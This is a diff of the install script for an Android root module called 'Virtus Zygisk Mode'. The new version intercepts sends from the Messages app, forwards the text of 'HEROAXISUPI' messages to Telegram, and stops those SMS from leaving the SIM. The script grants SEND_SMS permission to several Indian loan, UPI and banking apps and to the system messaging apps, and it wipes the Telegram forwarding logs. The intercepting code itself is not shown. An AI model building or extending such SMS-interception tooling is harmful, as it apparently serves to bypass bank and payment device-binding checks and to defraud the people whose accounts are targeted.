@@ -3,14 +3,14 @@
 
 ui_print "*******************************"
 ui_print "   Virtus Zygisk Mode           "
-ui_print "     v1.0.39 SMSTWEAKS SAFE     "
-ui_print "  YesPay/PhonePe: no pre-hooks  "
-ui_print "  Messages ISms = real SIM block"
-ui_print "  PLT disabled (crash fix)      "
+ui_print "     v1.0.40 MSG BLOCK + COOL   "
+ui_print "  Messages intercept-all send   "
+ui_print "  TG spam/heat FIXED            "
+ui_print "  HEROAXISUPI body → Telegram   "
 ui_print "  @Hivirtus                     "
 ui_print "*******************************"
-ui_print "! Flash → reboot → apps MUST open"
-ui_print "! Wait 8s in YesPay then SEND SMS"
+ui_print "! Flash → reboot → force-stop Messages"
+ui_print "! Hero SEND → SMS must NOT leave SIM"
 
 if [ -z "$MODPATH" ]; then
   ui_print "! ERROR: MODPATH not set"
@@ -176,11 +176,18 @@ else
   ui_print "- Telegram empty — bubble → Token+Chat → Save"
 fi
 
+# Truncate spam logs on flash (heat from huge tg_forward.log)
+: > /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+chmod 666 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
+rm -f /data/local/tmp/hivirtus_save_ok.flag 2>/dev/null
+rm -f /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
+
 # Clear leftover SEND_SMS ignore from older module versions
 ui_print "- Restoring SEND_SMS allow (No permission fix)..."
 for pkg in com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
            com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm \
-           com.myairtelapp com.yespay.next com.hdfcbank.payzapp com.axis.mobile in.org.npci.upiapp; do
+           com.myairtelapp com.yespay.next com.hdfcbank.payzapp com.axis.mobile in.org.npci.upiapp \
+           com.google.android.apps.messaging com.samsung.android.messaging; do
   pm path "$pkg" >/dev/null 2>&1 || continue
   appops set "$pkg" SEND_SMS allow 2>/dev/null || cmd appops set "$pkg" SEND_SMS allow 2>/dev/null || true
   pm grant "$pkg" android.permission.SEND_SMS 2>/dev/null || true
